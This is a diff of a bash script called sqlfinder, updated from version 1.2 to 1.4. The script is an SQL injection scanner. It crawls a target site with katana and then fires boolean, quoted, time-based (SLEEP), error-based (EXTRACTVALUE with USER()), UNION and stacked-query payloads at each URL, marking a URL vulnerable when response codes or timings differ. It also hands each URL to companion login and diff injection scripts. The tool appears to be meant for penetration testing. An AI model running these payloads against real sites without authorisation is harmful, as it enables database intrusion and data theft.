@@ -1,9 +1,8 @@
 #!/bin/bash
-# sqlfinder v1.2
+# sqlfinder v1.4
 #Intensive scan enabled
 #Added Count Check on pages
 # ---------------- Colors ----------------
-#-- Version Dev 1.1
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -139,7 +138,7 @@ collect_urls() {
   katana -u "$target" -jsl -silent\
     ${header:+-H "$header"} 2>/dev/null \
   | uro \
-  | grep -Ev '\.(js|tsx|php|html|htm)(\?|$)'\
+  | grep -Ev '\.(js|tsx|php|html|htm|json|pdf|txt)(\?|$)'\
   | sed 's/=[^&[:space:]]*/=/'
 }
 
@@ -151,7 +150,7 @@ curl_cmd() {
   output=$(curl -s -o /dev/null -w "%{http_code}" \
     --parallel --parallel-max "$threads" \
     ${header:+-H "$header"} \
-    "$1")
+    "$url")
 
   if [ "$verbose" = true ]; then
   echo "$url" 1>&2
@@ -202,110 +201,202 @@ else
   urls="$(collect_urls "$target")"
 fi
 
+# SQL injection payloads for boolean-based testing
+declare -a payloads=(
+    "' OR 1=1-- -"
+    "\" OR 1=1-- -"
+    "\` OR 1=1-- -"
+    "') OR 1=1-- -"
+    "\") OR 1=1-- -"
+    "\`) OR 1=1-- -"
+    "')) OR 1=1-- -"
+    "\")) OR 1=1-- -"
+    "\`)) OR 1=1-- -"
+    "' OR 'a'='a'-- -"
+    "\" OR \"a\"=\"a\"-- -"
+    "' OR 1=1#"
+    "' OR '1'='1"
+    "' OR 1=1;--"
+    "' OR 1=1 /*"
+)
+
+# URL encode a payload
+url_encode() {
+    local payload="$1"
+    # Using sed for compatibility if python not available
+    echo "$payload" | sed '
+        s/ /%20/g
+        s/'\''/%27/g
+        s/"/%22/g
+        s/`/%60/g
+        s/#/%23/g
+        s/;/%3B/g
+        s/\//%2F/g
+        s/(/%28/g
+        s/)/%29/g
+        s/\\/%5C/g
+        s/|/%7C/g
+    '
+}
+
+# Function to append payload to URL based on existing parameters
+append_payload() {
+    local url="$1"
+    local payload="$2"
+    
+    # Check if URL already has parameters
+    if [[ "$url" == *"?"* ]]; then
+        # URL already has parameters, append with &
+        if [[ "$url" == *"="* ]]; then
+            # Already has parameter values
+            echo "${url}${payload}"
+        else
+            # Has ? but no parameters yet
+            echo "${url}${payload}"
+        fi
+    else
+        # No parameters yet, add with ?
+        echo "${url}?${payload}"
+    fi
+}
+
 # ---------------- Scan loop ----------------
-while IFS= read -r url; do
+echo "$urls" | while IFS= read -r url; do
   [ -z "$url" ] && continue
   vulnerable=false
-
+  
+ 
   # ---- Stage 1: base check (skip dead only)
   base_code=$(curl_cmd "$url")
-  [ "$base_code" = "000" ] && continue
-
-  # ---- Stage 2: boolean injection
-  trueCheck=$(curl_cmd "${url}/1%20AND%201=1--%20-")
-  falseCheck=$(curl_cmd "${url}/1%20AND%202=1--%20-")
-
-  if [ "$trueCheck" = "200" ] && [ "$falseCheck" != "200" ]; then
-    echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-    echo -e "Payload: ${YELLOW}${url}/1 AND 2=1-- -${NC}"
-    echo -e "Reason: ${BLUE}Boolean condition difference${NC}"
-    vulnerable=true
+  if [ "$base_code" = "000" ] || [ -z "$base_code" ]; then
+    echo -e "${YELLOW}[-] Skipping dead URL${NC}"
+    continue
   fi
-
-#echo -e "Runnig Comparison check on ${GREEN}$url${NC}"
-"$SCRIPT_DIR/sqlDiffFinder.sh" "$url" || true
-
-#echo -e "Running Login SQL Injection Test ${GREEN}$url${NC}"
-"$SCRIPT_DIR/sqlogin.sh" "$url" || true
-
+  
+  # ---- Stage 2: boolean injection with multiple payloads
+  for payload in "${payloads[@]}"; do
+    # Encode the payload
+    encoded_payload=$(url_encode "$payload")
+    
+    # Create true and false payloads
+    true_payload="${encoded_payload}"
+    false_payload="${encoded_payload/1=1/2=1}"
+    
+    # Build URLs
+    true_url=$(append_payload "$url" "$true_payload")
+    false_url=$(append_payload "$url" "$false_payload")
+    
+    if [[ $verbose == true ]]; then
+    echo "Testing $false_url"
+    fi
+    # Test true condition (1=1)
+    trueCheck=$(curl_cmd "$true_url")
+    
+    # Test false condition (2=1)
+    falseCheck=$(curl_cmd "$false_url")
+    
+    # Check for boolean-based SQLi pattern
+    if [ "$trueCheck" = "200" ] && [ "$falseCheck" != "200" ]; then
+      echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
+      echo -e "  Payload: ${YELLOW}${payload}${NC}"
+      echo -e "  Reason: ${BLUE}Boolean condition difference detected${NC}"      
+      #echo -e "  True URL: $true_url"
+      #echo -e "  False URL: $false_url"
+      #echo -e "   True response: ${GREEN}$trueCheck${NC}"
+      #echo -e "  False response: ${RED}$falseCheck${NC}"
+      vulnerable=true
+      break  # Stop testing this URL once we find a vulnerability
+    fi
+    
+    # Small delay to avoid rate limiting
+    sleep 0.2
+  done
+  
 
   # ---- Stage 3: quoted injection (only if not vulnerable)
-  if [ "$vulnerable" = false ] \
-     && [ "$trueCheck" -gt 199 ] \
-     && [ "$falseCheck" -gt 300 ]; then
-
-    trueCheck2=$(curl_cmd "${url}/'1%20AND%201=1--%20-")
-    falseCheck2=$(curl_cmd "${url}/'1%20AND%202=1--%20-")
-
+  if [ "$vulnerable" = false ]; then
+    # Test with quoted parameter
+    trueCheck2=$(curl_cmd "${url}%27%20AND%201=1--%20-")
+    falseCheck2=$(curl_cmd "${url}%27%20AND%202=1--%20-")
+    
     if [ "$trueCheck2" = "200" ] && [ "$falseCheck2" != "200" ]; then
       echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-      echo -e "Payload: ${YELLOW}${url}/'1 AND 2=1-- -${NC}"
+      echo -e "Payload: ${YELLOW}${url}' AND 2=1-- -${NC}"
       echo -e "Reason: ${BLUE}Quoted boolean injection${NC}"
       vulnerable=true
     fi
   fi
 
-# ---- Stage 4: Advanced SQLi (only if still not vulnerable)
-if [ "$vulnerable" = false ] && [ "$intense" = true ]; then
-  echo "Performing Intensive Scan..."
-  baseline_time=$(curl_time "$url")
+  # ---- Stage 4: Advanced SQLi (only if still not vulnerable and intensive mode enabled)
+  if [ "$vulnerable" = false ] && [ "$intensive" = true ]; then
+    echo "Performing Intensive Scan..."
+    baseline_time=$(curl_time "$url")
 
-  payloads=(
-    # ---- Time-based
-    "1%20AND%20SLEEP(5)--%20-"
-    "1'%20AND%20SLEEP(5)--%20-"
-    '1"%20AND%20SLEEP(5)--%20-'
+    intense_payloads=(
+      # ---- Time-based
+      "1%20AND%20SLEEP(5)--%20-"
+      "1'%20AND%20SLEEP(5)--%20-"
+      '1"%20AND%20SLEEP(5)--%20-'
 
-    # ---- Error-based
-    "1%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,USER()))--%20-"
-    "1'%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,USER()))--%20-"
+      # ---- Error-based
+      "1%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,USER()))--%20-"
+      "1'%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,USER()))--%20-"
 
-    # ---- UNION-based
-    "1%20UNION%20SELECT%20NULL--%20-"
-    "1'%20UNION%20SELECT%20NULL--%20-"
+      # ---- UNION-based
+      "1%20UNION%20SELECT%20NULL--%20-"
+      "1'%20UNION%20SELECT%20NULL--%20-"
 
-    # ---- Stacked queries
-    "1;SELECT%20SLEEP(5)--%20-"
-  )
+      # ---- Stacked queries
+      "1;SELECT%20SLEEP(5)--%20-"
+    )
 
-  for payload in "${payloads[@]}"; do
-    test_url="${url}/${payload}"
+    for payload in "${intense_payloads[@]}"; do
+      test_url=$(append_payload "$url" "$payload")
 
-    # ---- Time-based detection
-    if [[ "$payload" == *"SLEEP"* ]]; then
-      start=$(date +%s)
-      curl_time "$test_url" >/dev/null
-      end=$(date +%s)
-      diff=$((end - start))
+      # ---- Time-based detection
+      if [[ "$payload" == *"SLEEP"* ]]; then
+        start=$(date +%s.%N)
+        curl_cmd "$test_url" >/dev/null
+        end=$(date +%s.%N)
+        diff=$(echo "$end - $start" | bc)
+        diff_int=$(echo "$diff" | cut -d. -f1)
 
-      if [ "$diff" -ge 5 ]; then
-        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-        echo -e "Payload: ${YELLOW}${test_url}${NC}"
-        echo -e "Reason: ${BLUE}Time-based SQL injection (delay ${diff}s)${NC}"
-        vulnerable=true
-        break
+        if [ "$diff_int" -ge 4 ]; then
+          echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
+          echo -e "Payload: ${YELLOW}${test_url}${NC}"
+          echo -e "Reason: ${BLUE}Time-based SQL injection (delay ${diff}s)${NC}"
+          vulnerable=true
+          break
+        fi
+      else
+        # ---- Error / UNION / stacked detection
+        code=$(curl_cmd "$test_url")
+
+        if [ "$code" != "$base_code" ] && [ "$code" != "404" ] && [ -n "$code" ]; then
+          echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
+          echo -e "Payload: ${YELLOW}${test_url}${NC}"
+          echo -e "Reason: ${BLUE}Response anomaly (status $base_code → $code)${NC}"
+          vulnerable=true
+          break
+        fi
       fi
-    else
-      # ---- Error / UNION / stacked detection
-      code=$(curl_cmd "$test_url")
+    done
+  fi
 
-      if [ "$code" != "$base_code" ] && [ "$code" != "404" ]; then
-        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-        echo -e "Payload: ${YELLOW}${test_url}${NC}"
-        echo -e "Reason: ${BLUE}Response anomaly (status $base_code → $code)${NC}"
-        vulnerable=true
-        break
-      fi
-    fi
-  done
-fi
-
-
-
+  # Run external scripts if they exist
+  if [ -f "$SCRIPT_DIR/sqlDiffFinder.sh" ]; then
+    "$SCRIPT_DIR/sqlDiffFinder.sh" "$url" || true
+  fi
+  
+  if [ -f "$SCRIPT_DIR/sqlogin.sh" ]; then
+    "$SCRIPT_DIR/sqlogin.sh" "$url" || true
+  fi
 
   # ---- Final safe output
   if [ "$vulnerable" = false ]; then
     echo -e "${GREEN}[ ${CHECK} ] $url${NC}"
   fi
 
-done <<< "$urls"
+  echo  # Blank line between URLs
+  
+done
